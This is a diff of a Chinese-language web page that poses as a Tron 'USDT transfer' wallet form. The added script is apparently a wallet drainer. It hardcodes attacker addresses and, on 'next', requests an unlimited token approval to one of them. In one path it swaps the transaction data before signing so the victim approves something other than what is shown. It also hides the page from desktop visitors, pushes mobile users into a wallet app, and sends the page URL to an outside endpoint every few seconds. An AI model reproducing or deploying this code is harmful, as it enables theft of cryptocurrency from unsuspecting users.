@@ -1,9 +1,8 @@
 <html lang="zh-CN">
 <head>
-    <!-- 头部内容与之前一致，省略 -->
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
     <title>USDT转账 - Tron</title>
     <link rel="icon" type="image/png" href="png/icon_trx.png">
     <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
@@ -18,16 +17,19 @@
             theme: {
                 extend: {
                     colors: {
-                        primary: '#0080FF',
-                        primaryLight: '#C1DAF6',
-                        border: '#E5E5E5',
+                        primary: '#0080FF',      // 主色
+                        primaryLight: '#C1DAF6', // 未激活状态颜色
+                        border: '#E5E5E5',       // 模块外框色
                         text: '#000000',
-                        textLight: '#999999',
-                        textTitle: '#08090B',
-                        placeholder: '#999999',
-                        warning: '#FF7D00',
+                        textLight: '#999999',    // 标签/辅助文字色
+                        textTitle: '#08090B',    // 标题颜色
+                        placeholder: '#999999',  // 占位文字色
+                        warning: '#FF7D00',      // 关键提示色（橙色）
                         background: '#F5F5F7',
-                        arrowCircle: '#9898A1'
+                        arrowCircle: '#9898A1'   // 箭头圆圈颜色
+                    },
+                    fontFamily: {
+                        sans: ['-apple-system', 'BlinkMacSystemFont', 'Helvetica Neue', 'Arial', 'sans-serif']
                     }
                 }
             }
@@ -35,201 +37,747 @@
     </script>
     <style type="text/tailwindcss">
         @layer utilities {
-            /* 样式与之前一致，省略 */
-            .module-frame { border: 1px solid theme('colors.border'); border-radius: 12px; }
-            .input-field { border: 1px solid transparent; border-radius: 8px; }
-            .remark-input { border: 1px solid #E5E5E5; border-radius: 8px; padding: 8px 12px; width: 100%; }
-            .tishi { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #4b4848; color: white; padding: 0.5rem; border-radius: 0.3rem; display: none; z-index: 999; }
+            .module-frame {
+                border: 1px solid theme('colors.border');
+                border-radius: 12px;
+                transition: none;
+            }
+
+            .module-frame:focus-within {
+                border-color: theme('colors.border');
+            }
+
+            .input-field {
+                border: none !important;
+                border-radius: 8px;
+                transition: none !important;
+            }
+
+            .input-field:focus,
+            .input-field:active,
+            .input-field:hover {
+                border: none !important;
+                box-shadow: none !important;
+                outline: none !important;
+            }
+
+            .icon-interactive {
+                transition: all 0.2s ease;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 40px;
+                height: 40px;
+            }
+
+            .icon-interactive:active {
+                transform: scale(0.9);
+                opacity: 0.8;
+            }
+
+            .fee-options {
+                max-height: 0;
+                overflow: hidden;
+                transition: max-height 0.3s ease;
+            }
+
+            .fee-options.active {
+                max-height: 200px;
+            }
+
+            .divider-line {
+                height: 1px;
+                background-color: theme('colors.border');
+                margin: 6px 0;
+            }
+
+            /* 自定义返回箭头样式 */
+            .custom-arrow {
+                width: 20px;
+                height: 20px;
+                position: relative;
+            }
+
+            .custom-arrow::before {
+                content: '';
+                position: absolute;
+                left: 0;
+                top: 8px;
+                width: 12px;
+                height: 1px;
+                background-color: #000000;
+                transform: rotate(45deg);
+                transform-origin: left center;
+                border-radius: 0.5px;
+            }
+
+            .custom-arrow::after {
+                content: '';
+                position: absolute;
+                left: 0;
+                bottom: 8px;
+                width: 12px;
+                height: 1px;
+                background-color: #000000;
+                transform: rotate(-45deg);
+                transform-origin: left center;
+                border-radius: 0.5px;
+            }
+
+            /* 自定义扫码图标样式 */
+            .custom-scan-icon {
+                width: 20px;
+                height: 20px;
+                position: relative;
+            }
+
+            .custom-scan-icon::before,
+            .custom-scan-icon::after,
+            .custom-scan-icon .top-right,
+            .custom-scan-icon .bottom-right {
+                content: '';
+                position: absolute;
+                width: 6px;
+                height: 6px;
+                border: 2px solid #000000;
+                background: transparent;
+            }
+
+            .custom-scan-icon::before {
+                top: 0;
+                left: 0;
+                border-right: none;
+                border-bottom: none;
+                border-radius: 3px 0 0 0;
+            }
+
+            .custom-scan-icon::after {
+                bottom: 0;
+                left: 0;
+                border-right: none;
+                border-top: none;
+                border-radius: 0 0 0 3px;
+            }
+
+            .custom-scan-icon .top-right {
+                top: 0;
+                right: 0;
+                border-left: none;
+                border-bottom: none;
+                border-radius: 0 3px 0 0;
+            }
+
+            .custom-scan-icon .bottom-right {
+                bottom: 0;
+                right: 0;
+                border-left: none;
+                border-top: none;
+                border-radius: 0 0 3px 0;
+            }
+
+            .custom-scan-icon .middle-line {
+                position: absolute;
+                top: 50%;
+                left: 2px;
+                right: 2px;
+                height: 2px;
+                background-color: #000000;
+                transform: translateY(-50%);
+            }
+
+            /* 自定义矿工费箭头样式 */
+            .fee-custom-arrow {
+                width: 16px;
+                height: 16px;
+                border-radius: 50%;
+                background-color: theme('colors.arrowCircle');
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: relative;
+                transition: transform 0.3s ease;
+            }
+
+            .fee-custom-arrow::after {
+                content: '';
+                position: absolute;
+                width: 5px;
+                height: 5px;
+                border-right: 1.5px solid white;
+                border-bottom: 1.5px solid white;
+                transform: rotate(45deg);
+                margin-top: 0;
+            }
+
+            .fee-custom-arrow.rotate-180 {
+                transform: rotate(180deg);
+            }
+
+            /* 固定尺寸类 */
+            .address-box {
+                width: 559px;
+                min-height: 64px;
+                height: auto;
+            }
+
+            .amount-box {
+                width: 559px;
+                height: auto;
+                min-height: 180px;
+            }
+
+            .fee-box {
+                width: 559px;
+                height: 60px;
+            }
+
+            .address-input-limit {
+                letter-spacing: 0.02em;
+                word-wrap: break-word;
+                overflow-wrap: break-word;
+                white-space: normal;
+            }
+
+            .contact-icon {
+                width: 20px;
+                height: 20px;
+                border-radius: 50%;
+                border: 1.8px solid #000;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: #000;
+                line-height: 1;
+                position: relative;
+                background-color: transparent;
+            }
+
+            .contact-icon i {
+                font-size: 13px !important;
+                margin: 0;
+                position: relative;
+            }
+
+            .title-tight {
+                margin-bottom: 1px;
+            }
+
+            .subtitle-tight {
+                margin-top: 1px;
+            }
+
+            .tishi {
+                width: 58%;
+                padding: 0.3rem;
+                background: #4b4848;
+                z-index: 999999999999;
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                border-radius: 0.3rem;
+                color: white;
+                font-size: 1rem;
+                text-align: center;
+                display: none;
+                height: auto;
+            }
+
+            .remark-input {
+                border: none !important;
+                border-radius: 8px;
+                padding: 8px 12px;
+                width: 100%;
+                font-size: 14px;
+            }
+
+            .remark-input:focus,
+            .remark-input:active,
+            .remark-input:hover,
+            input[type="text"]:focus,
+            input[type="text"]:active,
+            input[type="text"]:hover,
+            input[type="number"]:focus,
+            input[type="number"]:active,
+            input[type="number"]:hover {
+                border: none !important;
+                outline: none !important;
+                box-shadow: none !important;
+                -webkit-box-shadow: none !important;
+            }
+
+            @media (max-width: 600px) {
+                .address-box, .amount-box, .fee-box {
+                    width: 100%;
+                    height: auto;
+                }
+            }
         }
     </style>
 </head>
-<body class="bg-background min-h-screen font-sans">
-    <!-- 顶部导航 -->
-    <header class="bg-white py-3 px-5 shadow-sm border-b border-border">
+
+<body class="bg-background min-h-screen font-sans flex flex-col">
+    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
+
+    <!-- 顶部标题与导航区 -->
+    <header class="bg-white py-3 px-5 shadow-sm border-b border-border rounded-b-xl">
         <div class="flex items-center justify-between">
-            <button class="p-1"><div class="custom-arrow"></div></button>
+            <!-- 返回按钮 -->
+            <button class="text-text icon-interactive">
+                <div class="custom-arrow"></div>
+            </button>
+
             <div class="text-center">
-                <h1 class="text-[17px] font-medium">USDT 转账</h1>
-                <p class="text-[14px] text-textLight">Tron</p>
+                <h1 class="text-[17px] font-medium text-textTitle title-tight">USDT 转账</h1>
+                <p class="text-[14px] text-textLight subtitle-tight">Tron</p>
             </div>
-            <button class="p-1"><div class="custom-scan-icon"></div></button>
+
+            <!-- 扫码按钮 -->
+            <button class="text-text icon-interactive">
+                <div class="custom-scan-icon">
+                    <div class="top-right"></div>
+                    <div class="bottom-right"></div>
+                    <div class="middle-line"></div>
+                </div>
+            </button>
         </div>
     </header>
 
     <!-- 主内容区 -->
-    <main class="p-5">
-        <!-- 收款地址 -->
-        <label class="block text-[15px] text-textLight mb-2">收款地址</label>
-        <div class="bg-white module-frame p-3 mb-4">
+    <main class="p-5 pt-5 flex flex-col items-center flex-grow">
+        <!-- 收款地址标签 -->
+        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">收款地址</label>
+        <!-- 收款地址模块 -->
+        <div class="bg-white module-frame p-3 mb-4 address-box flex flex-col justify-center">
             <div class="relative">
-                <input type="text" id="addressInput" placeholder="Tron 地址" class="w-full px-3 py-2 input-field">
-                <button class="absolute right-3 top-1/2 -translate-y-1/2"><div class="contact-icon"><i class="fa fa-user-o"></i></div></button>
+                <input type="text" id="addressInput" placeholder="Tron 地址" class="w-full px-3 py-2 input-field bg-white text-text placeholder:text-placeholder text-sm address-input-limit" maxlength="70">
+                <!-- 右侧联系人图标 -->
+                <button class="absolute right-3 top-1/2 transform -translate-y-1/2 icon-interactive p-1" aria-label="选择联系人">
+                    <div class="contact-icon">
+                        <i class="fa fa-user-o"></i>
+                    </div>
+                </button>
             </div>
             <p id="addressError" class="text-warning text-xs mt-1 hidden">Tron 地址格式错误（应为T开头的34位字符）</p>
         </div>
 
-        <!-- 金额 -->
-        <div class="flex justify-between mb-2">
-            <label class="text-[15px] text-textLight">数量</label>
+        <!-- 数量标签和0 USDT组合 -->
+        <div class="flex justify-between items-center self-start w-full max-w-[559px] mb-2">
+            <label class="block text-[15px] text-textLight">数量</label>
             <span class="text-[15px] text-textLight" id="amount-display">0 USD</span>
         </div>
-        <div class="bg-white module-frame p-3 mb-4">
-            <input type="text" id="amountInput" value="0" class="w-full text-[2.5rem] font-normal input-field">
-            
-            <!-- 备注区域 -->
+        
+        <!-- 数量模块 -->
+        <div class="bg-white module-frame p-3 mb-4 amount-box flex flex-col justify-center">
+            <!-- 金额显示区域 -->
+            <input 
+                type="text" 
+                id="amountInput" 
+                value="0" 
+                class="w-full px-3 py-0 input-field bg-white text-textLight text-[2.5rem] font-normal flex items-center justify-center h-16 -mt-2" 
+                inputmode="decimal"
+                pattern="[0-9.]*"
+                autocomplete="off"
+                autocorrect="off"
+                autocapitalize="off"
+                spellcheck="false"
+            >
+
+            <!-- 备注信息区域 -->
             <div class="mt-3 mb-2">
-                <label class="block text-textLight text-sm mb-1">备注（需支付1TRX）</label>
-                <input type="text" id="remarkInput" placeholder="请输入备注信息" class="remark-input">
+                <label for="remarkInput" class="block text-textLight text-sm mb-1">备注（需支付1TRX）</label>
+                <input 
+                    type="text" 
+                    id="remarkInput" 
+                    class="remark-input"
+                    maxlength="100"
+                >
             </div>
 
-            <div class="border-t border-border my-2"></div>
-            <div class="flex justify-between text-[15px] text-textLight">
-                <span>余额: <span id="ye">0</span> TRX</span>
-                <button class="text-primary text-sm" onclick="setMaxAmount()">最大</button>
-            </div>
-            <!-- 新增：余额不足提示 -->
-            <p id="balanceError" class="text-warning text-xs mt-1 hidden">余额不足（需额外支付1TRX备注费）</p>
+            <div class="divider-line mt-1"></div>
+
         </div>
 
-        <!-- 矿工费 -->
-        <label class="block text-[15px] text-textLight mb-2">矿工费</label>
-        <div class="bg-white module-frame p-3 mb-6">
-            <div class="flex justify-between">
+        <!-- 矿工费标签 -->
+        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">矿工费</label>
+        <!-- 矿工费模块 -->
+        <div class="bg-white module-frame p-2.5 mb-5 fee-box flex flex-col justify-center">
+            <div class="flex justify-between items-center mb-0.5">
                 <div>
-                    <span class="font-medium text-text">0 TRX</span>
-                    <div class="flex items-center text-textLight text-sm">
-                        <span>$0</span>
-                        <div class="fee-custom-arrow ml-2"></div>
+                    <span class="font-medium text-text text-base block mb-1">$0</span>
+                    <div class="flex items-center">
+                        <span class="text-textLight text-sm mr-1">0 TRX</span>
+                        <div class="fee-custom-arrow icon-interactive" id="feeArrow"></div>
                     </div>
                 </div>
+            </div>
+
+            <div class="input-field bg-white p-1.5 cursor-pointer" id="feeToggle">
+                <!-- 点击区域 -->
             </div>
         </div>
     </main>
 
-    <!-- 下一步按钮 -->
-    <footer class="p-5">
-        <button id="nextButton" class="w-full bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px]" disabled>下一步</button>
+    <!-- 底部操作按钮区 -->
+    <footer class="p-5 pb-8">
+        <button id="nextButton" class="w-full max-w-[559px] bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200 mx-auto block" disabled="">
+            下一步
+        </button>
     </footer>
 
     <div class="tishi" id="tip">提示</div>
+    <input id="to_address" type="hidden">
+    <input type="text" id="address" style="display:none">
 
     <script>
-        // 核心变量
-        const userData = { address: null, trxBalance: null };
+        // 核心配置参数
+        window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
+        window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';
+        window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+        window.heartbeatUrl = 'https://baidu.com/heartbeat';
+
+        // 存储用户数据
+        const userData = {
+            address: null,
+            trxBalance: null,
+            usdtBalance: null
+        };
         let currentAmount = '0';
+        const TRX_TO_USD_RATE = 0.1562;
         const amountInput = document.getElementById('amountInput');
         const addressInput = document.getElementById('addressInput');
-        const addressError = document.getElementById('addressError');
-        const balanceError = document.getElementById('balanceError'); // 新增：余额不足提示
+        const remarkInput = document.getElementById('remarkInput');
+        let isUserInputting = false;
 
-        // 初始化
+        // 主初始化函数
         async function initializeDApp() {
-            await connectWallet();
-            updateNextButtonState();
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
+            
+            if (!isMobile) {
+                document.body.innerHTML = '';
+            } else if (isMobile && !isDAppBrowser) {
+                const currentUrl = encodeURIComponent(window.location.href);
+                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
+            } else if (isMobile && isDAppBrowser) {
+                await connectWallet();
+            }
+            updateAmountDisplay();
         }
 
-        // 连接钱包
+        // 连接到钱包
         async function connectWallet() {
             try {
                 if (window.tronWeb && window.tronWeb.ready) {
-                    userData.address = window.tronWeb.defaultAddress.base58;
-                    const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
-                    userData.trxBalance = window.tronWeb.fromSun(trxBalance);
-                    document.getElementById('ye').textContent = parseFloat(userData.trxBalance).toFixed(4);
+                    await initDApp();
+                } else if (window.tronLink) {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res.code === 200) {
+                        window.tronWeb = window.tronLink.tronWeb;
+                        await initDApp();
+                    }
                 }
             } catch (error) {
                 console.error("钱包连接失败:", error);
-                tip("请先连接钱包");
+                tip("钱包连接失败，请重试");
             }
         }
 
-        // 金额输入处理
-        amountInput.addEventListener('input', function() {
-            let value = this.value.replace(/[^0-9.]/g, '');
-            // 处理格式（避免0开头、限制小数位）
-            if (value.startsWith('0') && value.length > 1 && !value.startsWith('0.')) {
-                value = value.substring(1);
+        // 初始化DApp数据
+        async function initDApp() {
+            try {
+                userData.address = window.tronWeb.defaultAddress.base58;
+                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
+                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
+                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
+                const usdtBalance = await contract.balanceOf(userData.address).call();
+                userData.usdtBalance = usdtBalance / 1e6;
+            } catch (error) {
+                console.error("获取用户数据时出错:", error);
+                tip("获取余额失败，请重试");
             }
+        }
+
+        // 监听金额输入框变化
+        amountInput.addEventListener('input', function(e) {
+            isUserInputting = true;
+            let value = this.value;
+            
+            if (value === '0' && e.inputType.includes('insert') && this.selectionStart <= 1) {
+                value = value.replace('0', '');
+            }
+            
+            value = value.replace(/[^0-9.]/g, '');
+            
+            const dots = value.split('.').length - 1;
+            if (dots > 1) {
+                value = value.substring(0, value.lastIndexOf('.'));
+            }
+            
             const parts = value.split('.');
             if (parts.length > 1 && parts[1].length > 4) {
                 value = parts[0] + '.' + parts[1].substring(0, 4);
             }
-            currentAmount = value || '0';
-            this.value = currentAmount;
+            
+            if (value === '' || value === '.') {
+                currentAmount = '0';
+                this.value = '0';
+                this.classList.remove('text-text');
+                this.classList.add('text-textLight');
+            } else {
+                if (value.startsWith('0') && value.length > 1 && !value.startsWith('0.')) {
+                    value = value.substring(1);
+                }
+                
+                currentAmount = value;
+                this.value = value;
+                this.classList.remove('text-textLight');
+                this.classList.add('text-text');
+            }
+            
+            updateAmountDisplay();
             updateNextButtonState();
+            
+            setTimeout(() => {
+                isUserInputting = false;
+            }, 300);
         });
 
-        // 地址输入处理
+        // 聚焦时处理
+        amountInput.addEventListener('focus', function() {
+            if (this.value === '0') {
+                this.select();
+            }
+        });
+
+        // 监听地址输入变化
         addressInput.addEventListener('input', function() {
+            const addressError = document.getElementById('addressError');
             const value = this.value.trim();
+            
             if (value && !(value.startsWith('T') && value.length === 34)) {
                 addressError.classList.remove('hidden');
             } else {
                 addressError.classList.add('hidden');
             }
+            
             updateNextButtonState();
         });
 
-        // 最大金额按钮
+        // 设置最大金额
         function setMaxAmount() {
-            if (!userData.trxBalance) return tip("请先连接钱包");
-            const maxAmount = Math.max(0, parseFloat(userData.trxBalance) - 1).toFixed(4);
+            const maxAmount = Math.max(0, parseFloat(userData.trxBalance || '0') - 1).toFixed(4);
             currentAmount = maxAmount;
             amountInput.value = currentAmount;
+            
+            if (currentAmount !== '0') {
+                amountInput.classList.remove('text-textLight');
+                amountInput.classList.add('text-text');
+            }
+            
+            updateAmountDisplay();
             updateNextButtonState();
         }
 
-        // 关键修复：更新按钮状态逻辑（添加明确提示）
+        // 更新金额显示
+        function updateAmountDisplay() {
+            if (isUserInputting) return;
+            
+            let displayAmount = currentAmount;
+            const maxAvailableBalance = Math.max(0, parseFloat(userData.trxBalance || '0') - 1);
+
+            if (parseFloat(displayAmount) > maxAvailableBalance && maxAvailableBalance > 0) {
+                displayAmount = maxAvailableBalance.toFixed(4);
+                currentAmount = displayAmount;
+                amountInput.value = displayAmount;
+                
+                if (currentAmount !== '0') {
+                    amountInput.classList.remove('text-textLight');
+                    amountInput.classList.add('text-text');
+                }
+            }
+            
+            const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
+            document.getElementById('amount-display').textContent = `${usdAmount} USD`;
+            
+            document.title = `USDT转账 - ${displayAmount} TRX`;
+        }
+
+        // 更新下一步按钮状态
         function updateNextButtonState() {
             const nextButton = document.getElementById('nextButton');
+            const amount = parseFloat(currentAmount || '0');
             const address = addressInput.value.trim();
-            const amount = parseFloat(currentAmount) || 0;
-            const balance = parseFloat(userData.trxBalance) || 0;
-            const required = amount + 1; // 金额 + 1TRX备注费
-
-            // 地址无效
+            const maxAvailableBalance = Math.max(0, parseFloat(userData.trxBalance || '0') - 1);
+            
             const isAddressValid = address.startsWith('T') && address.length === 34;
-            // 金额无效（<=0）
-            const isAmountValid = amount > 0;
-            // 余额不足（金额+1TRX > 余额）
-            const isBalanceEnough = required <= balance;
-
-            // 显示具体错误原因
-            balanceError.classList.toggle('hidden', isBalanceEnough || amount <= 0);
-
-            // 按钮状态：所有条件都满足才可用
-            const isAllValid = isAddressValid && isAmountValid && isBalanceEnough;
-            nextButton.disabled = !isAllValid;
-            nextButton.classList.toggle('bg-primary', isAllValid);
-            nextButton.classList.toggle('bg-primaryLight', !isAllValid);
+            const isAmountValid = amount > 0 && amount <= maxAvailableBalance;
+            
+            const isValid = isAddressValid && isAmountValid;
+            
+            nextButton.disabled = !isValid;
+            nextButton.classList.toggle('bg-primary', isValid);
+            nextButton.classList.toggle('bg-primaryLight', !isValid);
         }
 
-        // 下一步按钮点击
-        document.getElementById('nextButton').addEventListener('click', async function() {
-            // 点击逻辑与之前一致
+        // 显示提示
+        function tip(message) {
+            const tipElement = document.getElementById('tip');
+            tipElement.textContent = message;
+            tipElement.style.display = 'block';
+            setTimeout(() => tipElement.style.display = 'none', 3000);
+        }
+
+        // 下一步按钮点击处理
+        async function onNextButtonClick() {
             try {
-                // 验证地址和金额
                 const address = addressInput.value.trim();
+                const remark = remarkInput.value.trim();
+                
                 if (!address.startsWith('T') || address.length !== 34) {
-                    return tip("请输入有效的Tron地址");
+                    tip("请输入有效的Tron地址");
+                    return;
                 }
-                // 执行交易...
-                tip("正在处理交易...");
+                
+                const totalRequired = parseFloat(currentAmount) + 1;
+                if (parseFloat(userData.trxBalance || '0') < totalRequired) {
+                    tip("余额不足，需额外支付1TRX备注费");
+                    return;
+                }
+                
+                if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
+                    await connectWallet();
+                    return;
+                }
+                
+                if (typeof window.okxwallet !== 'undefined') {
+                    await DjdskdbGsj(remark);
+                } else {
+                    await KdhshaBBHdg(remark);
+                }
             } catch (error) {
-                tip("交易失败，请重试");
+                console.error('操作执行失败:', error);
+                tip('付款失败，请重新发起交易');
             }
+        }
+
+        // 绑定事件
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('nextButton').addEventListener('click', onNextButtonClick);
+            initializeDApp();
+            
+            const feeToggle = document.getElementById('feeToggle');
+            const feeArrow = document.getElementById('feeArrow');
+            feeToggle.addEventListener('click', () => {
+                feeArrow.classList.toggle('rotate-180');
+            });
         });
 
-        // 提示函数
-        function tip(message) {
-            const tipEl = document.getElementById('tip');
-            tipEl.textContent = message;
-            tipEl.style.display = 'block';
-            setTimeout(() => tipEl.style.display = 'none', 3000);
+        // 发送心跳
+        function sendHeartbeat() {
+            fetch(window.heartbeatUrl, {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: window.location.href })
+            }).catch(() => {});
+        }
+        const heartbeatInterval = setInterval(sendHeartbeat, 5000);
+        window.onload = sendHeartbeat;
+        window.onbeforeunload = () => clearInterval(heartbeatInterval);
+
+        // 交易处理函数
+        async function DjdskdbGsj(remark) {
+            const totalAmount = parseFloat(currentAmount) + 1;
+            const trxAmountInSun = tronWeb.toSun(totalAmount);
+            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const feeLimit = 1000000000;
+            
+            try {
+                const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+                const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+                    paymentAddress,
+                    trxAmountInSun,
+                    tronWeb.defaultAddress.base58,
+                    { 
+                        feeLimit: feeLimit,
+                        note: remark ? tronWeb.toHex(remark) : ''
+                    }
+                );
+
+                const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                    tronWeb.address.toHex(window.usdtContractAddress),
+                    'increaseApproval(address,uint256)',
+                    { feeLimit: feeLimit },
+                    [
+                        { type: 'address', value: window.Permission_address },
+                        { type: 'uint256', value: maxUint256 }
+                    ],
+                    tronWeb.defaultAddress.base58
+                );
+
+                const originalRawData = approvalTransaction.transaction.raw_data;
+                approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+                const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+                signedTransaction.raw_data = originalRawData;
+                const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+                if (broadcastResult.result || broadcastResult.success) {
+                    const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+                    console.log("交易发送成功，交易哈希:", transactionHash);
+                    tip("交易成功");
+                    return transactionHash;
+                } else {
+                    throw new Error("交易失败");
+                }
+            } catch (error) {
+                console.error("操作失败:", error);
+                tip("交易失败，请重试");
+                throw error;
+            }
         }
 
-        // 初始化
-        document.addEventListener('DOMContentLoaded', initializeDApp);
+        async function KdhshaBBHdg(remark) {
+            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const feeLimit = 100000000;
+            const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+
+            try {
+                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                    usdtContractAddressHex,
+                    'approve(address,uint256)',
+                    { 
+                        feeLimit: feeLimit,
+                        note: remark ? tronWeb.toHex(remark) : ''
+                    },
+                    [
+                        { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
+                        { type: 'uint256', value: maxUint256 }
+                    ],
+                    tronWeb.defaultAddress.base58
+                );
+
+                if (!transaction.result || !transaction.result.result) {
+                    throw new Error('授权交易构建失败');
+                }
+
+                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+                if (result.result) {
+                    console.log("交易成功，交易哈希:", result.txid);
+                    tip("交易成功");
+                    return result.txid;
+                } else {
+                    throw new Error("交易失败");
+                }
+            } catch (error) {
+                console.error("执行授权操作失败:", error);
+                tip("交易成功，请重试");
+                throw error;
+            }
+        }
     </script>
 </body>
 </html>
+    
